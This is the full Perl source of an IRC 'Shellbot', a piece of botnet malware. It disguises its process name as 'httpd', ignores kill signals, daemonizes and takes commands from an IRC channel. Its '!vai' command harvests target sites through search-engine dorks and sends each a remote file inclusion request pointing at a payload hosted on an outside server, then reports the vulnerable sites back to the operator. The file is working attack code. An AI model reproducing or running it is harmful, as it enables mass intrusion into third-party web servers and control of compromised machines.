#!/usr/bin/perl

my $processo = 'httpd';
use HTTP::Request;
use LWP::UserAgent;

#CONFIGURATION
my $linas_max='4';
my $sleep='5';
my $evals="http://www.e-creative.nl/img/recado.txt";
my $evalrep="http://testeironm.izihost.org/teste.php";
my @adms=("ironm");
my @canais=("#lol");
my $chan="#lol";
my $nick='Tatizinha';
my $ircname ='Tatizinha';

$realname = "Tatiana";
$servidor='irc.mildnet.org' unless $servidor;
my $porta='6667';
my $VERSAO = 'Shellbot by Alex';
$SIG{'INT'} = 'IGNORE';
$SIG{'HUP'} = 'IGNORE';
$SIG{'TERM'} = 'IGNORE';
$SIG{'CHLD'} = 'IGNORE';
$SIG{'PS'} = 'IGNORE';
use IO::Socket;
use Socket;
use IO::Select;
chdir("/");
$servidor="$ARGV[0]" if $ARGV[0];
$0="$processo"."\0"x16;;
my $pid=fork;
exit if $pid;
die "Problema com o fork: $!" unless defined($pid);


our %irc_servers;
our %DCC;
my $dcc_sel = new IO::Select->new();

$sel_cliente = IO::Select->new();
sub sendraw {
  if ($#_ == '1') {
    my $socket = $_[0];
    print $socket "$_[1]\n";
  } else {
      print $IRC_cur_socket "$_[0]\n";
  }
}


sub conectar {
   my $meunick = $_[0];
   my $servidor_con = $_[1];
   my $porta_con = $_[2];

   my $IRC_socket = IO::Socket::INET->new(Proto=>"tcp", PeerAddr=>"$servidor_con", PeerPort=>$porta_con) or return(1);
   if (defined($IRC_socket)) {
     $IRC_cur_socket = $IRC_socket;

     $IRC_socket->autoflush(1);
     $sel_cliente->add($IRC_socket);

     $irc_servers{$IRC_cur_socket}{'host'} = "$servidor_con";
     $irc_servers{$IRC_cur_socket}{'porta'} = "$porta_con";
     $irc_servers{$IRC_cur_socket}{'nick'} = $meunick;
     $irc_servers{$IRC_cur_socket}{'meuip'} = $IRC_socket->sockhost;
     nick("$meunick");
     sendraw("USER $ircname ".$IRC_socket->sockhost." $servidor_con :$realname");
     sleep 1;
   }
}
my $line_temp;
while( 1 ) {
   while (!(keys(%irc_servers))) { conectar("$nick", "$servidor", "$porta"); }
   delete($irc_servers{''}) if (defined($irc_servers{''}));
   my @ready = $sel_cliente->can_read(0);
   next unless(@ready);
   foreach $fh (@ready) {
     $IRC_cur_socket = $fh;
     $meunick = $irc_servers{$IRC_cur_socket}{'nick'};
     $nread = sysread($fh, $msg, 4096);
     if ($nread == 0) {
        $sel_cliente->remove($fh);
        $fh->close;
        delete($irc_servers{$fh});
     }
     @lines = split (/\n/, $msg);
$msg =~ s/\r\n$//;

if ($msg=~ /\!raw\s+(.*)/){
print $IRC_cur_socket "$1\r\n";
}

if ($msg=~ /PRIVMSG $chan :!vai\s+(.*?)\s+(.*)/) {
if (my $pid = fork) {
waitpid($pid, 0);
} else {
if (fork) {
exit;
} else {
sleep(1);

my $contatore=0;
my $bug=$1;
my $chiave=$2;
sendraw($IRC_cur_socket, "PRIVMSG $chan :15(7@2Scan15)(2$bug15)");
sendraw($IRC_cur_socket, "PRIVMSG $chan :15(7@2Scan15)(2$chiave15)");
my @google=google($chiave);
sendraw($IRC_cur_socket, "PRIVMSG $chan :15(7@2Scan15)(2Google7:12".scalar(@google)." Sites15)");
my @yahoo=yahoo($chiave);
sendraw($IRC_cur_socket, "PRIVMSG $chan :15(7@2Scan15)(2Yahoo7:12".scalar(@yahoo)." Sites15)");
my @msn=msn($chiave);
sendraw($IRC_cur_socket, "PRIVMSG $chan :15(7@2Scan15)(2Msn7:12".scalar(@msn)." Sites15)");
my @lycos=lycos($chiave);
sendraw($IRC_cur_socket, "PRIVMSG $chan :15(7@2Scan15)(2Lycos7:12".scalar(@lycos)." Sites15)");
my @altavista=altavista($chiave);
sendraw($IRC_cur_socket, "PRIVMSG $chan :15(7@2Scan15)(2Altavista7:12".scalar(@altavista)." Sites15)");
push(@total, @google, @yahoo, @msn, @lycos, @altavista);
sendraw($IRC_cur_socket, "PRIVMSG $chan :15(7@2Scan15)(2Total7:12".scalar(@total)." Sites15)");
@unici=unici(@total);
my $uni = scalar(@unici);
sendraw($IRC_cur_socket, "PRIVMSG $chan :15(7@2Scan15)(2Cleaned7:12".$uni." Sites15)");
foreach my $test (@unici) {
sleep(1);
$contatore++;
if ($contatore %30==0){
sendraw($IRC_cur_socket, "PRIVMSG $chan :15(7@2Scan15)(2Exploiting7:12".$contatore." of ".$uni."15)");
}
if ($contatore==$uni){
sendraw($IRC_cur_socket, "PRIVMSG $chan :15(7@2Scan15):15(7@2Finish15) $chiave");
}
my $testurl="http://".$test.$bug.$evals."?";
my $printurl="http://".$test.$bug.$evalrep."?";
my $req=HTTP::Request->new(GET=>$testurl);
my $ua=LWP::UserAgent->new();
$ua->timeout(5);
my $response=$ua->request($req);
if ($response->is_success) {
if( $response->content =~ /1122548/ ){
sendraw($IRC_cur_socket, "PRIVMSG $chan :15(7@2Scan15)15(2Exploiting7:12 ".$printurl."15)");
}}}
exit;
}}}
     for(my $c=0; $c<= $#lines; $c++) {
       $line = $lines[$c];
       $line=$line_temp.$line if ($line_temp);
       $line_temp='';
       $line =~ s/\r$//;
       unless ($c == $#lines) {
         parse("$line");
       } else {
           if ($#lines == 0) {
             parse("$line");
           } elsif ($lines[$c] =~ /\r$/) {
               parse("$line");
           } elsif ($line =~ /^(\S+) NOTICE AUTH :\*\*\*/) {
               parse("$line");
           } else {
               $line_temp = $line;
           }
       }
      }
   }
}
sub parse {
   my $servarg = shift;
   if ($servarg =~ /^PING \:(.*)/) {
     sendraw("PONG :$1");
   } elsif ($servarg =~ /^\:(.+?)\!(.+?)\@(.+?) PRIVMSG (.+?) \:(.+)/) {
       my $pn=$1; my $hostmask= $3; my $onde = $4; my $args = $5;
       if ($args =~ /^\001VERSION\001$/) {
         notice("$pn", "\001VERSION mIRC v6.16 Khaled Mardam-Bey\001");
       }
         if ($args =~ /^(\Q$meunick\E|\!vai)\s+(.*)/ ) {
            my $natrix = $1;
            my $arg = $2;
         }
       }
    elsif ($servarg =~ /^\:(.+?)\!(.+?)\@(.+?)\s+NICK\s+\:(\S+)/i) {
       if (lc($1) eq lc($meunick)) {
         $meunick=$4;
         $irc_servers{$IRC_cur_socket}{'nick'} = $meunick;
       }
   } elsif ($servarg =~ m/^\:(.+?)\s+433/i) {
       nick("$meunick|".int rand(999999));
   } elsif ($servarg =~ m/^\:(.+?)\s+001\s+(\S+)\s/i) {
       $meunick = $2;
       $irc_servers{$IRC_cur_socket}{'nick'} = $meunick;
       $irc_servers{$IRC_cur_socket}{'nome'} = "$1";
       foreach my $canal (@canais) {
         sendraw("JOIN $canal ddosit");
       }
   }
}

sub google {
my $inizio=0;
my $chiave=$_[0];
$chiave =~ s/ /\+/g;
$chiave =~ s/:/\%3A/g;
$chiave =~ s/\//\%2F/g;
$chiave =~ s/&/\%26/g;
$chiave =~ s/"/\%22/g;
$chiave =~ s/\\/\%5C/g;
my $pagine=100;
my @lista;
my $num=0;
my $pag=1;
while ($inizio <= $pagine){
my $yahoo="http://arianna.libero.it/search/abin/integrata.cgi?s=1&pag=$pag&start=$num&query=$chiave";
my $req=HTTP::Request->new(GET=>$yahoo);
my $ua=LWP::UserAgent->new();
$ua->agent('Netscape 4.78/U.S., 25-Jun-01; (c) 1995-2000');
my $response=$ua->request($req);
my $resp=$response->content;
while ($resp=~ m/<a class=\"?testoblu\"? href=\"?http:\/\/(.+?)\//g){
my $ok="$1/";
push(@lista,$ok);
}
$inizio++;
$num=$num+10;
$pag++;
}
return @lista;
}

sub yahoo(){
my $inizio=0;
my $chiave=$_[0];
$chiave =~ s/ /\+/g;
$chiave =~ s/:/\%3A/g;
$chiave =~ s/\//\%2F/g;
$chiave =~ s/&/\%26/g;
$chiave =~ s/"/\%22/g;
$chiave =~ s/\\/\%5C/g;
my $pagine=14;
my @lista;
while ($inizio <= $pagine){
my $av= ($inizio * 100) +1;
my $yahoo="http://search.yahoo.com/search?ei=UTF-8&p=$chiave&n=100&fr=sfp&b=$av";
my $req=HTTP::Request->new(GET=>$yahoo);
my $ua=LWP::UserAgent->new();
$ua->agent('Netscape 4.78/U.S., 25-Jun-01; (c) 1995-2000');
my $response=$ua->request($req);
my $resp=$response->content;
while ($resp=~ m/<em class=yschurl>(.+?)\<\/em>/g ){
my $ok = $1;
$ok =~ s/<b>//g;
$ok =~ s/<\/b>//g;
$ok =~ s/<wbr>//g;
my @words = split /\//, $ok;
my $oks="$words[0]/";
push(@lista,$oks);
}
$inizio++;
}
return @lista;
}

sub msn(){
my $chiave=$_[0];
$chiave =~ s/ /\+/g;
$chiave =~ s/:/\%3A/g;
$chiave =~ s/\//\%2F/g;
$chiave =~ s/&/\%26/g;
$chiave =~ s/"/\%22/g;
$chiave =~ s/\\/\%5C/g;
my $inizio=1;
my $pagine=150;
my @lista;
my $av=1;
while($inizio <= $pagine){
my $msn="http://search.live.com/results.aspx?q=$chiave&first=$av&FORM=PERE";
my $req=HTTP::Request->new(GET=>$msn);
my $ua=LWP::UserAgent->new();
$ua->agent('Netscape 4.78/U.S., 25-Jun-01; (c) 1995-2000');
my $response=$ua->request($req);
my $resp=$response->content;
while ($resp=~ m/<a href=\"?http:\/\/(.+?)\//g ){
if ($1 !~ /msn|live|google|yahoo/){
my $ok="$1/";
push(@lista,$ok);
}}
$av=$av+10;
$inizio++;
}
return @lista;
}

sub altavista(){
my $chiave=$_[0];
$chiave =~ s/ /\+/g;
$chiave =~ s/:/\%3A/g;
$chiave =~ s/\//\%2F/g;
$chiave =~ s/&/\%26/g;
$chiave =~ s/"/\%22/g;
$chiave =~ s/\\/\%5C/g;
my $inizio=0;
my $pagine=150;
my $av=0;
while($inizio <= $pagine){
my $altavista="http://www.altavista.com/web/results?itag=ody&kgs=3&q=$chiave&stq=$av";
my $req=HTTP::Request->new(GET=>$altavista);
my $ua=LWP::UserAgent->new();
$ua->agent('Netscape 4.78/U.S., 25-Jun-01; (c) 1995-2000');
my $response=$ua->request($req);
my $resp=$response->content;
while ($resp=~ m/<span class=ngrn>(.+?)\//g ){
my @words = split /\</, $1;
my @worde = split /\ /, $words[0];
my $ok="$worde[0]/";
push(@lista,$ok);
}
$inizio++;
$av=$av+10;
}
return @lista;
}

sub lycos(){
my $inizio=0;
my $pagine=25;
my $chiave=$_[0];
$chiave =~ s/ /\%2B/g;
$chiave =~ s/:/\%253A/g;
$chiave =~ s/\//\%252F/g;
$chiave =~ s/&/\%2526/g;
$chiave =~ s/"/\%2522/g;
$chiave =~ s/\\/\%255C/g;
my $av=0;
my @lista;
while($inizio <= $pagine){
my $lycos="http://search.lycos.com/?query=$chiave&page=$av";
my $req=HTTP::Request->new(GET=>$lycos);
my $ua=LWP::UserAgent->new();
$ua->agent('Netscape 4.78/U.S., 25-Jun-01; (c) 1995-2000');
my $response=$ua->request($req);
my $resp=$response->content;
while ($resp=~ m/<span class=\"?grnLnk small\"?>http:\/\/(.+?)\//g ){
my $ok="$1/";
push(@lista,$ok);
}
$inizio++;
$av++;
}
return @lista;
}

sub unici{
my @unici = ();
my %visti = ();
foreach my $elemento ( @_ )
{
next if $visti{ $elemento }++;
push @unici, $elemento;
}
return @unici;
}

sub nick {
  return unless $#_ == 0;
  sendraw("NICK $_[0]");
}